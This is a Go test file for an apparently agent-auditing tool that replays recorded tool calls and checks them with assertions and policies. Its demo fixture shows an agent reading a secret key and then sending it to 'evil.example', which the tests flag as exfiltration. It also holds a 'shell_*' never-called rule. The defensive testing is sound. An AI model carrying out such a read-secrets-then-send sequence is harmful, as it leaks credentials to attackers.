package scenario

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/Caseymccallum/tapelog/internal/policy"
	"github.com/Caseymccallum/tapelog/internal/replay"
)

func it(order int, tool, args, result, verdict string) replay.Interaction {
	return replay.Interaction{
		Order: order, Tool: tool,
		Args: json.RawMessage(args), Result: json.RawMessage(result),
		Verdict: verdict,
	}
}

// demoTape models: build -> read_secrets(allowed) -> test -> send_http -> deploy.
func demoTape() *replay.Tape {
	return &replay.Tape{Interactions: []replay.Interaction{
		it(1, "build_artifact", `{"target":"prod"}`, `{"text":"built"}`, "allow"),
		it(2, "read_secrets", `{"path":"/secrets/key"}`, `{"text":"sk-[REDACTED]"}`, "allow"),
		it(3, "test_artifact", `{}`, `{"text":"ok"}`, "allow"),
		it(4, "send_http", `{"url":"https://evil.example"}`, `{"text":"sent"}`, "allow"),
		it(5, "deploy", `{"channel":"stable"}`, `{"text":"success"}`, "allow"),
	}}
}

func TestAssertionsPass(t *testing.T) {
	sc := &Scenario{Version: 1, Assert: []Check{
		{Called: &CalledSpec{Tool: "deploy", Args: map[string]any{"channel": "stable"}}},
		{Called: &CalledSpec{Tool: "build_artifact", Times: intPtr(1)}},
		{NeverCalled: "shell_*"},
		{Sequence: []string{"build_*", "test_*", "deploy"}},
		{ResultContains: &ResultSpec{Tool: "deploy", Text: "success"}},
		{Allowed: "deploy"},
		{Invariant: "no_deny_bypassed"},
	}}
	if fails := Run(sc, demoTape(), nil); len(fails) != 0 {
		t.Fatalf("expected all to pass, got %+v", fails)
	}
}

func TestAssertionsFail(t *testing.T) {
	sc := &Scenario{Version: 1, Assert: []Check{
		{NeverCalled: "send_*"},                    // send_http WAS called
		{TaintNever: &TaintSpec{From: "read_secrets", To: "send_*"}}, // exfil!
		{Called: &CalledSpec{Tool: "deploy", Times: intPtr(2)}},      // only 1
		{Sequence: []string{"deploy", "build_artifact"}},             // wrong order
		{Denied: "deploy"},                                          // was allowed
		{Invariant: "bogus_invariant"},
	}}
	fails := Run(sc, demoTape(), nil)
	if len(fails) != 6 {
		t.Fatalf("expected 6 failures, got %d: %+v", len(fails), fails)
	}
}

func TestPolicyReevaluation(t *testing.T) {
	// A policy that denies deploy flips `allowed: deploy` into a failure
	// and trips no_deny_bypassed (results exist for would-be-denied calls).
	policyPath := filepath.Join(t.TempDir(), "p.yaml")
	if err := os.WriteFile(policyPath, []byte(`
version: 1
default: allow
rules:
  - id: no-deploy
    tool: "deploy"
    action: deny
    reason: "deploys are frozen"
`), 0o600); err != nil {
		t.Fatal(err)
	}
	p, err := policy.Load(policyPath)
	if err != nil {
		t.Fatal(err)
	}
	sc := &Scenario{Version: 1, Assert: []Check{
		{Allowed: "deploy"},
		{Invariant: "no_deny_bypassed"},
	}}
	fails := Run(sc, demoTape(), p)
	if len(fails) != 2 {
		t.Fatalf("expected 2 failures under frozen policy, got %+v", fails)
	}
}

func TestParseValidation(t *testing.T) {
	dir := t.TempDir()
	bad := filepath.Join(dir, "bad.yaml")
	if err := os.WriteFile(bad, []byte("version: 1\nfixture: x.jsonl\nassert:\n  - {}\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(bad); err == nil {
		t.Fatal("empty check must fail")
	}
	good := filepath.Join(dir, "good.yaml")
	if err := os.WriteFile(good, []byte("version: 1\nscenario: s\nfixture: x.jsonl\nassert:\n  - never_called: shell_*\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	sc, err := Load(good)
	if err != nil {
		t.Fatal(err)
	}
	if ResolveFixture(sc, good) != filepath.Join(dir, "x.jsonl") {
		t.Fatal("fixture must resolve against the scenario dir")
	}
}

func intPtr(n int) *int { return &n }
